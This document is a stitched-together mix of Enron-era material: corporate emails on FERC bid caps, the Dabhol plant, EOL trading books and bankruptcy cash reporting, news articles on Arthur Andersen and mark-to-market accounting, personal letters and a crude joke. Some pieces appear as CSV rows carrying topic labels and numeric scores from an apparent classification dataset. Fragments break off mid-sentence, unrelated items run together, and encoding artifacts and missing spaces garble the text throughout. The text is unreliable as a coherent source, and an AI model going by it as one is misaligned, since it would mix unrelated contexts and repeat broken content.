These changes arecomprehensive and include the introduction of fair value --ormark-to-market--accounting. This last change, although seemingly innocuouswill be particularly powerful in its impact. But What Has All This To Do With Derivatives? The introduction of mark-to-market accounting requires listed Japanesecompanies to record their holding of marketable property assets andsecurities at current market value rather than at book value. This meansthat balance sheets will no longer be buttressed by assets valued atinflated bubble economy levels. But most crucially profit streams willbecome exposed to movements in equity markets, as the definition ofsecurities includes the cross shareholdings which bind members of Japan'sKeiretsu and other business groupings. These are substantial in Japan,accounting for perhaps 40% of all shareholdings. The unwinding of cross shareholdings is undoubtedly one of the factorsbehind the recent weakness of Tokyo stock prices, not least as foreignbuyers who had been soaking up much of the unwound cross held shares comingonto to the market have been notably absent over the past few months. Hence there has been much talk about how best to unwind these crossshareholdings without further depressing the market. Where possible firmswith mutual shareholdings have been seeking arrangements that areeffectively straight swaps. But derivatives can also play their part. Many corporates with large shareholding disposal programmes have beenactively seeking to hedge their equity exposure as they embark on theirshare sale process. Often they have effected this through the use of calloptions. Thus if the market falls they have at least benefited from thepremium earned at the time of the sale of the call option and if the marketrises and the option is called by the purchaser then the shares have beensuccessfully disposed of, but without further dampening an already weakmarket.",0.0,0.0,0.7,0.2
record keeping accounting practices,0,"A 'Very Difficult Time' Some audit controls, such as using computers to spot financial conflicts of interest with prospective clients, improved during four years of SEC prodding, Bowsher said. Other shortcomings continue because of resistance in the accounting industry, he said. ""We were pushing on some of these issues, but we were having a very difficult time having these things improved,'' Bowsher said in an interview. Peer reviews and accounting oversight are in the forefront of debate about audit regulations in the wake of Enron's collapse. The energy trader blamed bookkeeping errors, in financial statements certified by Andersen, for the need to restate earnings going back to 1997. Still, Andersen got unqualified good marks in its latest peer review, released Jan. 2. Andersen's reviewer, Deloitte & Touche LLP, looked at 240 audits after Andersen asked its rival for tougher-than-normal scrutiny while questions swirled about Enron. Enron's audit was not among those examined.Pitt's Proposal Pitt's outline for change calls for the SEC to work with the biggest accounting firms to create a private oversight body, with funding from outside the accounting industry, to monitor and discipline auditors. Former SEC Chairman Arthur Levitt, who appointed Turner, said last week that Pitt's proposal ``needs more teeth.'' An April 1997 letter, the earliest released under the freedom of information request, questioned whether cost saving in the name of efficiency was hurting the quality of audits and producing fewer records than peer reviewers needed. ""Some changes being undertaken in pursuit of operating goals, such as reducing audit hours and focusing audit objectives on increasing the perceived value of the audit to client management, may have the effect of compromising audit quality,'' wrote Michael Sutton, who was then SEC's chief accountant.

The most significant change from the prior draft is that we nowdelete any reference to specific price levels that would screen prices inCalifornia and focuses instead why a price-based analysis for marketmonitoring is inappropriate, since it fails to account for capacity costs,opportunity costs and scarcity values.FERC Staff has asked that EPSA be prepared to make a presentation at theJanuary 23rd conference, so it is important that we see if there isconsensus on this approach.

record keeping accounting practices,1,"Subject: EES Billing/Settlements FunctionJohn -The current functional reporting structure of Billing & Settlement's through EES poses near term and long term tactical risks we feel jeopardizes our ability to meet our goals and objectives.Currently, Deal Capture and Risk Analysis/Reporting report through Sally Beck. However, Settlements and Billing report through Evan Hughes (EES). As such, the reconciliation process (Wes Colwell and Wade Stubblefield) is held hostage to any piece that breaks down. In this structure we (ENA) are able to control the progress and performance of Deal Capture and Risk Reporting. We are making progress on these fronts. We are completely out of the loop re: current state of affairs on the billing side (other than it just doesn't work). We are also out of the loop in assuring the proper approach and solutions are being implemented. According to Anthony Dayao and other, there are approximately 11 different billing systems that feed CSC (we outsource billing to CSC apparently). Billing Group spent several months attempting to scope out the process and future requirements. This was done in conjunction with Union Finosa. I think that approximately $6.8 MM has been spent to date on this effort w/ Union Finosa (Anthony, is this accurate). Union Fin recently provided the group with a proposal and Anthony has negotiated 60 - 90 days to review and respond (Apparently, Billing wanted to go forward with just one week of comments). Bottom Line: this does not appear to be the proper approach to ensuring that we are solving our comprehensive billing/settlement issues as well as near term necessities.PROPOSED SOLUTION:Billing/Settlements should report to Sally Beck (dotted lines to ENA and EES)EES can maintain customer interface through call centers and logo on invoiceConvene an immediate meeting with Evan Hughes, Anthony Dayao et. al. to summarize current state (including Union Fenosa)Retain Accenture or KPMG to fully scope out current reality vs. business needsImplement action plan to address long term solution vs short term necessity.Until we can resolve this, I am afraid that 1) decisions are being made without full consideration of ENA's view of business needs and 2) ENA cannot be accountable for when and if we can ever provide monthly reconciliations and flash to actuals. As we all recognize, unless you can reconcile the books, you really don't have a legitimate business.John, could we convene a meeting if necessary for you to address these issues. I will be out next week and would like to leave knowing that we are on the path to getting this resolved.Thanks,Rogers",0.0,0.5,0.8,0.0

record keeping accounting practices,1,"Subject: Enron Mentions - 1/11 p.m.Top Of The News The Enron Chain Saw Massacre Dan Ackman, Forbes.com, 01.11.02, 8:16 AM ET The Enron scandal is becoming more and more like a horror movie: It's not what's on screen that scares you, it's the unseen monster in the dark. Yesterday, Enron's accountants and the presidential Cabinet officers added to the scare and sent the burgeoning scandal in new directions. Arthur Andersen, the esteemed accounting firm, admitted it had destroyed Enron documents. That's bad, but what Arthur Andersen says it doesn't know may be worse. It says the records included ""a significant but undetermined number of electronic and paper documents and correspondence."" The firm goes on to say, ""After receiving [an] SEC subpoena, the firm issued an instruction to preserve documents."" What, one wonders, was Andersen's ""instruction"" before it received the subpoena--to destroy Enron documents with abandon? Did the accountants comply with the directive to preserve the documents? Andersen doesn't know: ""At this time, we have not been able to determine whether that instruction was violated,"" the firm says in a statement. Andersen says it has ""also asked former U.S. Sen. John Danforth to conduct an immediate and comprehensive review of Andersen's records management policy and to recommend improvements."" It does not say how much it is paying Danforth for his counsel, but it can have this policy tip for nothing: Don't destroy documents related to a scandal that led to a bankruptcy that wiped out $70 billion in shareholder value. These unanswered questions are part of a pattern with Enron. No one really knows how it got so rich, or what it was doing with the many private partnerships managed by its executives. No one knows what prompted former Chief Executive Jeffrey Skilling to quit the company in August 2001. Indeed, at a bankruptcy court hearing earlier this week, it was revealed that Enron does not know the location of 79 of its top executives or even if they still work for the company. Separately, the White House revealed that Kenneth Lay, Enron's chairman, called Treasury Secretary Paul O'Neill and Commerce Secretary Don Evans to warn them of the company's looming bankruptcy. This disclosure came with an additional announcement that Attorney General John Ashcroft has recused himself from the criminal investigation of Enron because of contributions he's received from company executives. Ari Fleischer, the White House press secretary, said Lay telephoned O'Neill amid Enron's collapse ""to advise him about his concern about the obligations of Enron and whether they would be able to meet those obligations.'' Lay added that Enron ""was heading to bankruptcy,'' Fleischer said. O'Neill received calls from Lay on Oct. 28 and Nov. 8, said Treasury Spokeswoman Michele Davis. By then, Enron made its stunning disclosure of a $638 million third-quarter loss. Still, as of Oct. 28, Enron was still trading at over $15 per share.",0.0,0.0,0.9,0.2

NYISO Bid Caps Extended Until Ancillary Service Market Shown to be Workably 
Competitive

In a 3-1 decision, with Comm. Hebert dissenting, FERC extended the existing 
NYISO bid cap in its non-spinning reserves market and the related mandatory 
bidding requirement until such time as that market can be determined to be 
""workably competitive.""  At the same time, FERC ordered a technical 
conference to explore changes to the NYISO reserves market, and urged market 
participants to reach a consensus on a preferred solution, next steps, and 
deadlines for resolution/implementation.

In so doing, FERC rejected certain aspects of NYISO's September 1 and 8, 2000 
compliance filing, submitted pursuant to its May 31, 2000 order imposing a 
temporary bid cap through October 31.  The ISO's efforts to correct market 
flaws identified in the order and further strengthen market performance had 
not yet satisfied the Commission's directives, FERC concluded.  FERC found 
that while NYISO has achieved solid progress in certain areas, overall the 
ISO has not shown sufficient improvement to warrant raising and then 
gradually lifting the temporary bid cap in the ISO's non-spinning reserve 
market by April 2001, as the ISO requested.

Commissioner Reaction:

Comms. Hoecker, Massey and Breathitt all endorsed the order as an ""imperfect 
solution,"" yet a pragmatic approach toward resolving the flaws plaguing the 
ISO's market.  Comm. Hebert faulted the Commission for squandering an 
opportunity to incentivize additional supply by lifting the price controls. 
Hoecker and Breathitt joined Hebert in expressing disappointment in the lack 
of the ISO's progress, but contended that significant outstanding issues must 
be resolved before the bid cap can be lifted.

In other action, FERC accepted NYISO's and NEPOOL's proposed Emergency Energy 
Transaction Agreement, allowing NYISO and ISO-NE to provide emergency service

Enron's Dabhol Project Nears Auction Block


    Lenders to Enron's $2.9 billion Dabhol Power in India are set to put
it on the auction block, with 6 major companies likely to express
interest. The plant has been idle since last June after a dispute over the
cost of the power for its sole customer, the Maharashtra State Electricity
Board. Due diligence is expected to begin early next month, with a
possible deadline of the middle of March for submitting offers. Interested
foreign companies are Shell, TotalFinaElf and Gaz de France. Potential
Indian buyers are BSES Ltd, Tata Power and Gas Authority of India.
Publicity which focused on Enron's problems in India has given the
country's image a black eye as a safe place to invest. Some in India claim
that Enron coerced and hoodwinked a freshly elected state government into
signing off on a power project it had previously tried to stop. The World
Bank, which refused to fund the project, said it was too large, too costly
and the terms were slanted in Enron's favor. Maharashtra's demand for
energy did not rise as expected and meanwhile, the devaluation of the
Indian rupee and climbing prices for naphtha raised the price of power
production. Enron owns 65% of the Dabhol project, GE and Bechtel each own
10% and the Maharashtra State Electricity Board 15%. Those interested in
acquiring the plant must put up a non-refundable $100,000 in earnest
money. The sellers intend to sell the plant as a whole, but bidders may
bid jointly for the operation and split it up later. A London data room
will be established for the commercial and financial agreements, operating
and historical data, projections and information on the status of Phase
II. Construction on the 1,444 MW second phase was stopped when the state
electricity board fell $240 million behind in payments. The 740 MW first
phase was launched in 1999.

dispel. It has taken a while, but we're getting there. Hence, her saying at
the end of the conversation that she's against fundamentalism, rather than
religious people in general. She needs to take more of those strides.

You may certainly hold anarchist views (I respect that), but that night I
think you were simply expressing an abhorrence of gross generalization. I'm
glad we see eye to eye on that. Live and let live and all that. But once
Cameron says something like that, she feels she must stick by it. The
devil's advocate line is so boring: one must speak one's mind, not
contradict for contradiction's sake. (Do devil's advocates have nothing
themselves to believe in, so they simply take the opposing view for
something to hold onto?) Cameron has a bit too much of the devil's advocate
in her. I hope I can cast some spells to purge that ornery Lucifer from her.
I think I'll be less sucessful there. After all, she is a lawyer at heart.

Maybe next time we see each other you can explain to me exactly what a
social liberterian is. I really don't have a clear concept in my head there.

Hope you're having a nice day.

mark to market accounting practices,1,"If there is any part of this story that demands an investigation - by Congress, by Justice, by the accounting industry itself - it is the moral failure of a leading firm in the profession to fulfill its moral duty to unflinchingly, and without bias, uncover the truth and present to the weak, the vulnerable and those without influence or voice. But we can't stop at Arthur Andersen. The real ""values"" crisis represented by the Enron mess is far deeper, and stretches across our economy. We are all being victimized by it, and the situation is growing ever worse. It is the great unreported business story of our time: the growing failure of the accounting system to accurately capture what is going in the new hyperspeed economy. Simply put, we have no idea what any company is worth today. The accounting industry is mired in a system that was devised 600 years ago and has only been fine-tuned ever since. It doesn't work any more. Accountants know it, corporate executives know it, and the stock market knows it. The general recognition of this fact has led to a widespread ethical sloppiness made manifest in such things as Arthur Andersen's apparent conflict. The reality is that the only time anybody really checks an audit anymore is after a financial disaster like Enron, when scapegoats must be found. Rear-View Mirror Accounting I once likened traditional accounting to driving a car by only looking in the rear view mirror. It can tell you where a company has recently been, but it is unable to tell you where that company is now. And in a world in which change occurs in nanoseconds, such obsolete data is worthless. Today, events arrive so swiftly, and change so constant, that it is no longer even enough to operate in the present. Modern business now runs in the future. The result is a growing gap between traditional ""book"" value and actual market value - and through that gap drives not only companies like Enron, but truly valuable firms like General Electric and Intel. Traditional accounting has long dealt with that gap through a line entry entitled ""goodwill."" But it was typically only added when a company sold for more than the total value of its inventory, buildings, etc. At most, this goodwill only represented a few percent of the total value. That was then. In the modern economy, for great, fast moving, innovative young companies this so-called ""goodwill"" can represent 90 percent of their value. When a corporate audit can only tell us about ten percent of a company, what the hell is the point? There have been a number of efforts in recent years to come up with innovative new ways to determine corporate value, many of them under the all-encompassing terms ""intellectual capital"" or ""intangible assets"". But they are still in their earliest stages, and most slam up against the formidable wall of the traditional accounting industry.",0.0,0.2,0.8,0.6

Subject:	EOL - Multiple Trading Books (URGENT)

Tim and John, I wanted to touch base with you regarding a problem that we have run into between EOL and a trader having multiple trading books. EOL has been set up to have a trader associated with one and only one trading book in the stack manager. As a result, when creating the interface between EOL and Enpower we can cannot assign multiple trading books to one person. David Poston in the Enpower IT support group in Houston has been working with the EOL group and has come up with a solution.

1. If you definitely plan to be trading on EOL for all trading books associated with your name, EOL IT can define certain products to each trading book. If this is the approach that you would like to take, I will need a list of what products you want to trade and to which trading book they are affiliated with. 

2. The other option is that you will just use one trading book under your name. If that is the case, no changes will have to be made.

If the plan is to use the first option, please let me know so we can make the changes and do the necessary testing on this.

mark to market accounting practices,1,"Bad trading. Enron's main technique to pump up earnings probably revolvedaround a loose-as-a-goose process for the accounting of energy derivatives.Called mark-to-market, the technique involves evaluating contracts at ""fairvalue"" prices. Since some of these contracts stretched out for 20 years, thefutures market provides no firm prices. And, absent a liquid market withclear prices, ""fair value"" becomes a mug's game in which companies canvastly inflate value. These overstated gains, of course, were also unrealized, noncash gains. InSeptember 2000, Jonathan Weil, a reporter for the Journal, took a look atEnron's second quarter and found that absent noncash earnings, Enron wouldhave had a loss. Mr. Weil later found that for the year as a whole,unrealized trading gains accounted for more than half of the company'soriginally reported pretax profits. Hardly a confidence-builder in thequality of Enron's earnings.When their derivative strategies started to go sour, this theory runs, Enronremoved the contracts from its financial statements and hid them in specialentities created for just that purpose.Bad Assets. Another theory locates Enron's earning problems in their hardassets. Enron had a bunch of huge and underperforming assets, like itsbroadband company, water company and power plants in India and Brazil. Inorder to hustle those assets and associated debts off its financial reports,the company created some limited partnerships to buy these dogs -- eitherwith bank loans or money provided by Enron itself. These partnerships(allegedly) transferred enough control to third parties to get them offEnron's balance sheet. Enron guaranteed these deals with ""make good"" provisions backed by Enronstock -- a promise that Enron would make good any losses in the value of thepartnerships. When the value of the assets tanked, the make-good provisionskicked in, resulting, for example, in the enormous write-down in shareholderequity in November.Depending on which theory one accepts, there are two bottom lines.The first holds that the sagging earnings problem was fatal and that it isentirely possible Enron was in the process of liquidating itself. Jim Chanosof Kynikos Associates hypothesizes that Enron's cost of capital was higherthan its returns on invested capital. A second argues that if Enron'smanagers had been content to accept the fact that in competitive marketstheir ""first mover"" advantage was going to be competed away, and had beenwilling to endure slower earnings growth, it would not be in bankruptcytoday.",1.0,0.8,0.8,0.8

Enron Reiterates Plan to Cut Stake in India's Dabhol Power Co.
1/25/1 6:27 (New York)

Enron Reiterates Plan to Cut Stake in India's Dabhol Power Co.

     New Delhi, Jan. 25 (Bloomberg) -- Enron Corp., the world's
biggest energy trader, reiterated its plan to cut its stake in
India's Dabhol Power Co. to 50 percent from 65 percent.
     The Indian government yesterday said it had permitted an
Enron affiliate to invest a further $233 million in constructing
the second phase of Dabhol Power Co. in the western state of
Maharashtra.
     ``Enron is not picking up any additional stake and is not
investing any additional amount of equity in Dabhol over the
amount previously agreed,'' a release issued by the U.S. company's
public relations counsel said.
     Completing the second phase of the 1,920 megawatt power plant
is crucial to the Enron unit to prune its cost of power, at a time
when the state government says it is reviewing a contract to buy
electricity from Dabhol because its rates are too high.
     The state board, which is Dabhol's only customer, is finding
it tough to pay for the power it buys from the company. It is now
being helped by the local government to clear a part of its dues.
     The second phase of the project is likely to be completed by
January 2002 and will help the entire facility switch from naphtha
to lower-priced liquefied natural gas.
     Enron, one of the first big overseas companies to enter India
after New Delhi opened up the economy to foreign investors, saw
construction of the $3 billion plant delayed until December 1996
because of legal battles with local governments.
     Enron shares rose 1.5 percent to 79 3/16 in New York
yesterday.

Shareholder proposals seeking to limit the accounting firms' rol=es have surfaced at a wide range of companies following Enron's meltdown.

In November, Enron restated its results for the previous four =years, wiping out $586 million, or 20%, of its previously reported earnings=. In recent testimony before Congress, Andersen officials have said they do=n't believe their independence as an auditor was compromised by the nonaudi=ting fees.=20""It took Enron to get shareholders interested in addressing this issue, but= many investors want auditor independence,"" says Patrick McGurn, vice presi=dent of Institutional Shareholder Services, a proxy adviser that makes reco=mmendations for how institutions should vote.=20Shareholders are proposing these policies for about 30 companies, including= Apple Computer Corp., Johnson & Johnson, Motorola Inc., PG&E Corp. and Wal=t Disney Co.

record keeping accounting practices,1,"11/12/2001The Wall Street JournalC1(Copyright (c) 2001, Dow Jones & Company, Inc.)What could Arthur Andersen have done to protect the investing public from Enron? Brushing up on a basic accounting textbook might have helped, some critics say. Confirming investors' fears, the Houston energy trader Thursday filed a lengthy disclosure document with the Securities and Exchange Commission declaring that its financial statements going back to 1997 ""should not be relied upon"" and will have to be restated. Among other problems, Enron acknowledged overstating its net income by a total of $586 million, or 20%. Enron's financial statements long have been widely assailed as indecipherable. Now, it turns out, they were just plain wrong.But what is most striking about the latest disclosures is that they show Enron's misstatements weren't limited merely to judgment calls and gray areas for the green-eyeshade crowd to debate. Portions of Enron's accounting practices amounted to violations of elementary accounting principles, some accounting specialists say. Citing client-confidentiality rules, an Andersen spokesman, David Tabolt, declines to comment on his firm's work for Enron, which on Friday agreed to be bought by crosstown rival Dynegy. He calls Enron's disavowal of its previous financial statements an ""unfortunate situation"" and says Andersen is cooperating with the SEC's Enron investigation and the special committee formed by Enron to investigate the company's accounting and disclosure practices. Consider the primary reason for the $1.2 billion reduction in shareholder equity that Enron revealed in mid-October, sparking much of the downdraft in the company's shares. At the time, Enron said the reduction came about because it had decided to unwind certain transactions with some limited partnerships with which it had done business. On Thursday, however, Enron acknowledged that the original accounting for the transactions violated generally accepted accounting principles. Starting in early 2000, the company said last week, Enron issued shares of its own common stock to four ""special-purpose entities,"" in exchange for which it received a note receivable. Enron said it had increased both its note-receivable assets and shareholder equity, a move the company called ""an accounting error"" that it is correcting. Under GAAP, the payment a company receives when issuing stock only counts as equity if it is cash. As a result, Enron's 2000 audited financial statements overstated the company's notes-receivable assets and shareholder equity by $172 million. And Enron's 2001 unaudited statements overstated them by $828 million. The $1 billion overstatement represents 8.5% of Enron's previously reported shareholder equity as of June 30.",1.0,0.7,0.9,0.6

RANDOM,0,"Subject: ISO Motion for Issuance of Refund (ISO Report on Unjust Prices)


A couple of interested points from the CAISO report, in addition to the good 
points raised by Sue Mara:

During December and January, California relied on imports as much as it 
relied upon California non-utility-owned generation (p. 18).  Assuming a 70% 
capacity factor, the ISO said that in-state nonutility gen (i.e., Duke, 
Reliant, AES, Dynegy) is about 2,000 MW and the imports were about the same 
over the 55 day period analyzed.

There is no mention anywhere in the report regarding the level of scarcity in 
the state--nothing on reserve margins or outages.  Thus, there are huge holes 
in the analysis w.r.t. the claim that prices were unjust and unreasonable.

And even though= Enron did break out $1 billion in earnings charges in its release, the com=pany didn't feel it necessary to mention the equity write down anywhere in =the text.=20Instead, the public first heard about it on a Tuesday conference call. CEO =Kenneth Lay said Enron had shrunk its equity as a result of terminating a s=o-called ""structured finance arrangement."" The Wall Street Journal later re=ported that Enron's counter-party in this transaction was an investment par=tnership called LJM2 Co-Investment, which has set up and run by Enron's fin=ance chief, Andrew Fastow.=20This is what Lay said on the Tuesday call about the equity move: ""In connec=tion with the early termination, shareholders' equity will be reduced appro=ximately $1.2 billion, with a corresponding significant reduction in the nu=mber of diluted shares outstanding."" According to The Journal, Lay then sai=d Wednesday on another call that Enron had repurchased 55 million shares.==20Enron's supporters count Lay's mention of a reduction in the share count as= bullish, because it should boost earnings per share numbers in the future.==20But there are two possible problems with this theory.=20First, Enron affirmed its previous earnings guidance that it expects to mak=e $2.15 per share in operating earnings next year. Critically, the company =did not say whether its guidance was given using a share count without the =55 million shares or not. If the forecast does assume the exclusion of the =55 million shares, the company should have upped its 2002 per-share earning=s forecast by around 6%, since that's the amount by which the share count w=ill be reduced. Enron needs to say what share count it's using in its guida=nce.=20Second, it's almost impossible to determine where these shares were ever re=corded, casting a certain amount of doubt on Lay's assertion that the share= count will come down.=20Why question the CEO? Well, in its 2000 annual report, Enron included some =disclosure of the 55 million shares connected with LJM2. It reads: ""At Dece=mber 31, 2000, Enron had derivative instruments...on 54.8 million shares of= Enron common stock.""

        Story With A Moral 

        A boy rode on a donkey and the old man walked.  As they went along they passed some people who remarked it was a shame the old man was walking and the boy was riding.  The man and boy thought maybe the critics were right, so they changed positions. 

        Later, they passed some people that remarked, ""What a shame, he makes that little boy walk.""They then decided they both would walk! 

        Soon they passed some more people who thought they were stupid to walk when they had a decent donkey to ride. So,they both rode the donkey. 


        Now they passed some people that shamed them by saying how awful to put such a load on a poor donkey. The boy and man said they were probably right, so they decided to carry the donkey. 

        As they crossed the bridge, they lost their grip on the animal and he fell into the river and drowned. 

        The moral of the story? 

        If you try to please everyone, you might as well kiss your ass good-bye.

Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

Sincerely,

Robin Charo",0.0,0.0,0.3,0.6

Subject:	Enron Japan - Joe Hirl visit

Rick - 

Joe Hirl is scheduled to visit the Houston office this week and I think he is trying to schedule a meeting with you.  Bill Bradford mentioned that I might want to bring you up to speed on some of the recent developments in that office. Though much of the background information is probably old news for you, there are some issues that might come up in your meeting.

As you know, Enron Japan has made the move from Power to Global Markets.  To date, Enron Japan has not submitted proposals for new  VaR limits or products, but I believe their meetings with the Houston management this week are to determine such.  I think by the end of the week, they will have a better idea of what exactly they will trade, what limits they will want trade under, the systems they will need to implement, etc.  

Last week, the commercial team discussed with me the possibilities of trading petrochemicals through  a new exchange - The Tokyo Commodities Exchange.  To jumpstart the Global Markets business, the team intends to be quite active on the exchange, trading Gasoline and Kerosene.

From a Credit perspective, we need to get a better idea of how transactions in the exchange will be managed.  The exchange is unusual in that there is not a clearinghouse.  Rather, any order we post will be matched to a specific counterparty, which could be any of 80 or so ""Broker Members"".  Credit risk is somewhat mitigated in that each counterparty in every trade must post an initial margin amount to be held and used to reduce default risk.  However, as far as I can tell, there will be no incremental margin call when exposure increases beyond the initial margin amount.  This has the potential of opening Enron to significant counterparty risk with counterparties with whom we might not necessarily be comfortable.  The information packet I received does vaguely discuss a ""Protection Fund"" that might mitigate default risk.  I will follow-up on this issue, but for now, protection is unclear.

From a market risk perspective, I will make sure the team has the appropriate approvals in place for VaR limits and products to be traded prior to transacting.  I will also make sure the right systems are in place to capture transactions, volumes, etc. - and have these aggregate into the daily RiskTrac reports.

  some accounting and billing, but i'm working in the commercial group doing
advertising and support to the engineers for the most part.  the company is

great, we just celebrated 15 years of business last month. it is a small
firm, and many of the staff members are pretty young, i am still the
youngest, however.  i found the job online, and i liked it after the first
interview.

my sisters are doing great, jacqui is a senior at lamar, and dominique is
working towards her last year of school and then she has a year of student
teaching. she has been dating hunter sage for almost 3 years now.  he is in

his first year of law school at UT.  jacqui's boyfriend of a year and 2
months (they celebrated last week) is also a senior at lamar.  really great

guy! i think when i buy the townhouse, dominique will probably move in with

me, her student teaching is unpaid, so she will be looking for a free
place,
i'm sure.  jacqui is not sure about next year, she wanted to go to art
school in new york, and my family took a vacation there in august of this
year, but now with everything going on, she is not sure.  i think i may
start taking some graduate classes next fall at U of H, but i'm still
researching what i want to study.  any vacations for you recently?

i'm really glad you wrote me back, i've been thinking about you and
wondering what you have been doing for a while.  take care.

Subject: Re: 


We went into the FERC proceeding believing that the Chief ALJ was not
likely to give us a good decision.  During the course of the proceeding, we
convinced ourselves that he would rule our way due to the vast evidence in
our favor and the relatively inept presentation of El Paso and El Paso
Merchant Energy.  Well, despite the voluminous record in support of our
position, the judge ruled that it was ""not at all clear"" that El Paso
exercised market power.  The good news for your affiliates is that, if the
Commission does not find the exercise of market power in this case, it
never will.  We hope when the Commission reviews the entire record,
including the ""protected material"", they will change the ALJ's finding.  On
some level we believe that the ALJ just does not like California.  He is
the judge, after all, who told Harold Ray in the electric generation
settlement discussions that he was ""an asshole"".  The ironic part of the
decision is that we felt that a determination by the ALJ that defined the
market in such a way as to preclude EPME having market power would be
difficult to overcome at the Commission level.  Instead, he defined the
market as we suggested and found that El Paso had market power; he simply
failed to be convinced that they were withholding capacity despite the fact
that they utilized their capacity 54% of the time when everyone else was
utilizing their own capacity at a capacity factor of between 85% and 90%.
Go figure.

I am still less than enchanted with the NGS settlement  after SoCalGas
tailored it to their interests but am glad that the Commission is at least
considering opening up the system ala PG&E.   I think that they are
reasonably aware that SoCalGas was not blameless in the runup in gas prices

Here is the PG&E 10-K disclosure, which does not help much.


Under AB 1890, when the Utility has recovered its eligible transition 
costs, the conditions for terminating the rate freeze and ending the 
transition period will have been satisfied. At August 31, 2000, consistent 
with transition period accounting mechanisms adopted by the CPUC, the Utility 
credited its TCBA by $2.1 billion, the amount by which a negotiated $2.8 
billion hydroelectric generation asset valuation exceeded the aggregate book 
value of such assets. Based on this credit, the Utility believes it recovered 
its eligible transition costs during August 2000. At August 31, 2000, there 
was a balance of approximately $2.2 billion of undercollected wholesale power 
costs recorded in the TRA. If the final valuation for the hydroelectric assets 
is greater than $2.8 billion, as the Utility expects, the Utility believes it 
will have recovered its transition costs possibly as early as May 2000. The 
undercollected TRA balance as of the end of the earlier determined transition 
period will be less than the $2.2 billion August 31, 2000 balance and could be 
zero depending on the ultimate valuation of the hydroelectric assets and when 
the transition period actually ends. Under current CPUC decisions and AB 1890, 
the Utility's customers are responsible for wholesale power purchase costs 
after the Utility has recovered its transition costs. 
  
   In one of its March 27, 2001 decisions, the CPUC adopted TURN's proposal to 
transfer on a monthly basis the balance in each utility's TRA to the utility's 
TCBA. The accounting changes are retroactive to January 1, 1998. The Utility 
believes the CPUC is retroactively transforming the undercollected power 
purchase costs in the TRA into transition costs in the TCBA. However, the CPUC 
characterized the accounting changes as merely reducing the prior revenues 
recorded in the TCBA, thereby affecting only the amount of transition cost 
recovery achieved to date. The CPUC also ordered that the utilities restate 
and record their generation memorandum accounts balances to the TRA on a 
monthly basis before any transfer of generation revenues to the TCBA. The CPUC 
found that based on the accounting changes, the conditions for meeting the end 
of the rate freeze have not been met.

The current consensus estimate for its 2Q is $1.19. We are raising our

jurisdiction over the economic stimulus issue, the rural telco
groups touted lifting of the caps as a way to stimulate investment
in new telecom infrastructure and drive economic growth in rural
areas. =20

The telecom industry ""plays a critical role in ensuring the
nation's economic and national security. . .[but] rural telephone
companies are hamstrung by arbitrary federal rules,"" said the
letter, which was signed by the Organization for the Promotion and
Advancement of Small Telecommunications Companies, the National
Telephone Cooperative Association, the National Rural Telecom
Association, and the U.S. Telecom Association.

Proponents of lifting the caps say they cause service providers in
high-cost areas to miss out on about $100 million in annual
universal service assistance and discourage upgrades and investment
in newly acquired local exchange properties.  ""Congress can free
these companies to make investments by including the Universal
Service Support Act in the economic stimulus package,"" the telco
groups wrote.

""Additionally, because universal service support is privately
funded through carrier-to-carrier transactions, repeal of the caps
would not add to the cost of the stimulus package,"" the groups said
in the Oct. 18 letter.  ""Finally, repealing the caps would
facilitate another major policy objective of Congress and the
president--investment in the platform need for full broadband
deployment.""

Several telecom interests have been eyeing Congress's work on the
fiscal stimulus package as a possible means for gaining some quick
legislative relief (TR, Oct. 8).  The House's main economic
stimulus plan (HR 3090) has cleared the Ways and Means Committee
and awaits consideration on the floor.  In the Senate, where work
on the economic stimulus bill is still in the early stages, a ""Dear

leaders to consider approving S 500.

This memo addresses the financial reporting requirements Enron will have to its various constituents. During the reorganization, the Company will continue its GAAP reporting, with a breakout of pre and post petition liabilities, as well as historical management/operational reporting, consistent with past practices.In addition, the Company will have an added responsibility to report cash flows to the bankruptcy court and its various constituents. Specifically, Enron will be required to report projected cash receipts and cash disbursements by business unit on a weekly basis. The court and our new debtor-in-possession (""DIP"") lenders require a rolling 13 week projection of cash flows plus monthly projections thereafter to obtain a full year of projected cash flows. The budgeted weekly projections will then be compared to actual results to determine how well each business unit is operating compared to the projections. The weekly and monthly forecasts will be adjusted each week pursuant to revised or improved information on forecasted cash flows. Thus this process will be an ongoing one, with constant updating of information to ensure we generate the most accurate reports possible.The initial weekly and monthly projections will be critical to the determination of the amount that the DIP lenders will be willing to make available to the Company. In addition, the cash flows for the entities that are included in the bankruptcy proceedings will be utilized by the bankruptcy court and DIP lenders to constantly review and react to the cash flow situation at Enron. However, all Enron business units (not just ones in bankruptcy) will need to conform to these new requirements, because additional entities are likely to be included in the bankruptcy filing and because it is extremely important for Enron management to be able to see the totality of cash flow requirements for the entire Company.The weekly cash flow projection project will be overseen by Mike Deville (x 57852) and Greg Adams (x 33887). In addition, Enron has retained Batchelder & Partners, Inc., a financial advisory firm, to assist us in this and other reorganization efforts.We will be having a group meeting with the CAO's and/or their designees from the various business units responsible for the cash projections on Wednesday, December 5 at 2:00 PM in the Boardroom on the 50th floor to further explain this process and answer any questions you may have.

With stronger natural gas prices and colder weather finally setting in,
heavy load energy costs gained ground across the Eastern Interconnect on
Wednesday.  ""It's cooler and cloudy here so demand picked up, but trade is
thinner since many players are already on vacation,"" said one Midwestern
player. The AGA weekly report listed a bearish 45-bcf withdrawal for the
previous week, well below expectations.  NYMEX Henry Hub natural gas futures
slipped in very late trade, with the front-month contract losing 4.1 cents
to close at 2.616$/mmBtu.  February edged down 6.2 cents to end at
2.65$/mmBtu.

Peak power prices rose in the Mid-Atlantic on Wednesday, despite a very
healthy generation landscape.  Prices at Western PJM traded in a quarter
spread, up about a buck on both the low and high ends.  Deals were heard in
the 24.9 to 25.15$/MWh range.  The winter contract was trading in a range
from 30.85 to 31.2$/MWh.  Real-time prices were up for the usual morning
peak periods of the day, but after 11:00 EST, they were on a steady decline,
and averaged 17.3$/MWh through 15:00 EST.  In weather news, temperatures
were forecast for the mid-40s on Thursday across the East, a few degrees
above normal for late in December.  Much of the same was predicted for the
next five days, with a slim rise in temperatures by the weekend.  The latest
